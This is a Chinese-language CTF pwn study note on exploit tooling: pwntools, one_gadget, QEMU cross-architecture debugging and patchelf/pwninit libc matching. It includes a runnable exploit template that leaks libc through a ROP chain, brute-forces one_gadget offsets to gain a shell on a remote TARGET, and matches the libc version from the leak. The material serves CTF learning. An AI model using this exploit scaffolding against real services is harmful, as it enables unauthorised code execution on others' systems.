---
title: pwn 自动化工具链 —— pwntools 模式、one_gadget、QEMU 与 gdb-multiarch
category: pwn
tags: [pwntools, one_gadget, qemu, gdb-multiarch, 工具链]
signals: [题目给了 libc 但本地环境 glibc 版本不一致需要 patchelf, 需要跨架构调试 arm 或 aarch64 二进制, 想批量爆破 one_gadget 约束条件, 手写 exp 交互太繁琐要写模板, 需要在本地复现远程的环境, 需要自动求偏移和 gadget]
difficulty: easy
source: "pwntools 官方文档 / one_gadget / QEMU 文档 / pwninit"
tools: [pwntools, one_gadget, ROPgadget, qemu-user, gdb-multiarch, pwndbg, pwninit, patchelf]
updated: 2026-10-23
---

## 一、识别信号（题面长什么样）

- 附件里有 `libc.so.6` + `ld-2.31.so`，但本地系统是 2.35 —— 需要 `patchelf` 或 `pwninit` 固定环境。
- 程序是 ARM / aarch64 / MIPS，本机 x86 跑不起来 —— 需要 `qemu-user` + `gdb-multiarch`。
- 已知偏移但 one_gadget 有好几个版本，逐个试太累 —— 需要脚本化。
- exp 里 `recvuntil` 写错一点就卡死 —— 需要更稳的交互封装。
- 想用 `pwntools` 的 `cyclic` / `ELF` / `ROP` 一次性把偏移、gadget、符号都算出来。

## 二、原理

### 1. pwntools 的核心对象

| 对象 | 作用 |
| --- | --- |
| `process` / `remote` | 本地 / 远程「管道」，统一 `send` / `recv` 接口 |
| `ELF` | 解析符号、段、GOT、`checksec`、`libc` 偏移 |
| `ROP` | 自动找 gadget、拼 `rop.chain()`、调用 `rop.call('system', [binsh])` |
| `flat` / `p32` / `p64` / `u64` | 结构化打包，`flat({0x40: p64(x)})` |
| `cyclic` / `cyclic_find` | 生成 / 定位偏移 |
| `context` | 全局 `arch` / `os` / `log_level` / `terminal` 设置 |
| `gdb.attach` | 断点自动化 |
| `LibcSearcher` / `libc-database` | libc 版本匹配（线上可 `libc.rip`） |

### 2. one_gadget

`one_gadget ./libc.so.6` 列出 `execve("/bin/sh", rsp+X, environ)` 的单条跳板地址及其约束。
约束通常是 `[rsp+0x50] == NULL`、`r12 == NULL` 之类，exp 里可以写循环检查寄存器是否可控。

```bash
one_gadget --raw ./libc-2.31.so                 # 只输出地址
one_gadget --level 1 ./libc.so.6                # 放宽约束
one_gadget --near __malloc_hook ./libc.so.6     # 找附近的
```

### 3. QEMU + gdb-multiarch

```bash
qemu-aarch64 -L ./lib -g 1234 ./pwn             # 开 gdbserver
gdb-multiarch ./pwn                             # 另一个终端
(gdb) set architecture aarch64
(gdb) target remote :1234
(gdb) b *0x400000
```

pwntools 侧：`process(['qemu-aarch64', '-L', './lib', '-g', '1234', './pwn'])`，
再 `io.gdbscript('set architecture aarch64\ntarget remote :1234\nb *0x4009a0\nc')` 即可自动连上。

### 4. 环境一致性

```bash
# 方案 A：patchelf 手动改 interpreter 与 rpath
patchelf --set-interpreter ./ld-2.31.so --set-rpath . ./pwn
# 方案 B：pwninit 自动做（推荐）
pwninit --bin ./pwn --libc ./libc.so.6
# 方案 C：docker 固定发行版
docker run -it --rm -v $PWD:/work ubuntu:20.04
```

## 三、解题步骤

1. **建模板**
   ```bash
   pwn template ./pwn --host HOST --port PORT > exp.py
   ```
2. **固定环境**：`pwninit` 生成 `pwn_patched`，之后所有本地测试都用补丁后的二进制。
3. **确认保护与符号**：`pwn checksec`、`elf.sym`、`elf.got`、`elf.plt`。
4. **自动算偏移**：`cyclic(200)` 打进去，`cyclic_find(0x..., n=8)`（注意 `n` 与架构对齐）。
5. **自动找 gadget**：`ROP(elf).find_gadget(['pop rdi','ret'])`，或 `ROP(libc)`。
6. **写交互封装**：把菜单操作写成函数，避免每次手数 `recvuntil`。

## 四、可直接运行的 exp 脚本

```python
#!/usr/bin/env python3
# 通用模板：本地/远程、libc 匹配、ROP 自动拼、one_gadget 爆破
from pwn import *

context.binary = elf = ELF('./pwn_patched')      # pwninit 产物
libc = ELF('./libc-2.31.so')
context.log_level = args.LOG or 'info'
context.arch = 'amd64'                          # 需要时改成 aarch64 / arm

HOST, PORT = 'TARGET', 1337

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.QEMU:                               # 跨架构
        return process(['qemu-aarch64', '-L', './lib', elf.path])
    return process(elf.path)

# ---------------- 交互封装 ----------------
def menu(choice):
    io.sendlineafter(b'> ', str(choice).encode())

def add(size, data):
    menu(1); io.sendlineafter(b'size: ', str(size).encode()); io.sendafter(b'data: ', data)
def show(idx): menu(4); io.sendlineafter(b'idx: ', str(idx).encode())
def free(idx): menu(3); io.sendlineafter(b'idx: ', str(idx).encode())
def edit(idx, data):
    menu(2); io.sendlineafter(b'idx: ', str(idx).encode()); io.sendafter(b'data: ', data)

# ---------------- 偏移与 gadget ----------------
def find_offset(value, n=8):
    return cyclic_find(value, n=n)

rop = ROP([elf, libc])
try:
    pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
    ret     = rop.find_gadget(['ret']).address
except Exception:
    pop_rdi = next(libc.search(asm('pop rdi; ret'), executable=True))
    ret     = next(libc.search(asm('ret'), executable=True))

io = start()

# ---------------- 泄漏 ----------------
# 常见模式：puts(puts@got) 后回到 main
OFFSET = find_offset(0x6161616c, 8)
payload = flat({OFFSET: [pop_rdi, elf.got['puts'], elf.plt['puts'], elf.sym['main']]})
io.sendafter(b'input: ', payload)
leak = u64(io.recvuntil(b'\n', drop=True)[:6].ljust(8, b'\x00'))
libc_base = leak - libc.sym['puts']
log.success(f'libc = {hex(libc_base)}')

# ---------------- one_gadget 爆破 ----------------
gadgets = [int(x, 16) for x in
           subprocess.check_output(['one_gadget', '--raw', './libc-2.31.so']).split()]  # 相对偏移
for g in gadgets:
    try:
        io2 = start()
        io2.sendafter(b'input: ', flat({OFFSET: [libc_base + g]}))
        io2.sendline(b'echo PWNED; id')
        if b'PWNED' in io2.recvrepeat(1.0):
            log.success(f'one_gadget hit @ {hex(g)}')
            io2.interactive()
            break
    except EOFError:
        continue
```

### libc 版本匹配

```python
from pwn import *
io = remote('TARGET', 1337)
leaked = u64(io.recv(6).ljust(8, b'\x00'))
# 方式 A：本地 libc-database
# ./find puts 0x7f00  -> 返回候选
# 方式 B：libc.rip 网页批量
# 方式 C：pwntools LibcSearcher（需联网）
from LibcSearcher import LibcSearcher
obj = LibcSearcher('puts', leaked)
libc_base = leaked - obj.dump('puts')
```

## 五、常见坑 / 变体

1. **`cyclic_find` 的第二个参数 `n`**：AArch64 / 64 位用 `n=8`，ARM32 用 `n=4`，写错就找不到。
2. **`context.arch` 的设置时机**：必须在创建 `p32/p64` 之前，或在 `flat` 里传 `word_size`。
3. **`pwninit` 会把二进制改名成 `pwn_patched`**，别忘了改 `ELF()` 路径。
4. **`patchelf` 的顺序**：先 `--set-interpreter`，再 `--set-rpath`，否则 loader 找不到 libc。
5. **`one_gadget --raw` 输出的是相对偏移**，跳转地址必须写成 `libc_base + g`。
6. **`recvuntil` 卡死的万恶之源**：用 `recvrepeat(0.5)` 或 `io.clean()` 兜底。
7. **`gdb.attach` 在 tmux 里要设 `context.terminal`**，否则 fallback 到 xterm。
8. **`process(['qemu-aarch64', ...])`** 传列表而不是字符串，避免路径空格问题。
9. **变体**：`pwnlib.tubes.remote` 对 IPv6 需要 `remote('::1', port)`；CTF 平台常给 `nc` 风格的 host。
10. **日志**：`context.log_level = 'debug'` 会打印全部收发，定位协议错位最快。

## 六、参考来源

- [pwntools 官方文档](https://docs.pwntools.com/en/stable/)
- [pwntools：ROP 模块](https://docs.pwntools.com/en/stable/rop/rop.html)
- [pwntools：ret2dlresolve 自动利用](https://docs.pwntools.com/en/stable/rop/ret2dlresolve.html)
- [one_gadget 仓库](https://github.com/david942j/one_gadget)
- [ROPgadget 仓库](https://github.com/JonathanSalwan/ROPgadget)
- [pwninit（一键 patchelf + 环境固定）](https://github.com/io12/pwninit)
- [QEMU 文档](https://www.qemu.org/docs/master/system/qemu-manpage.html)
- [pwndbg 仓库](https://github.com/pwndbg/pwndbg)
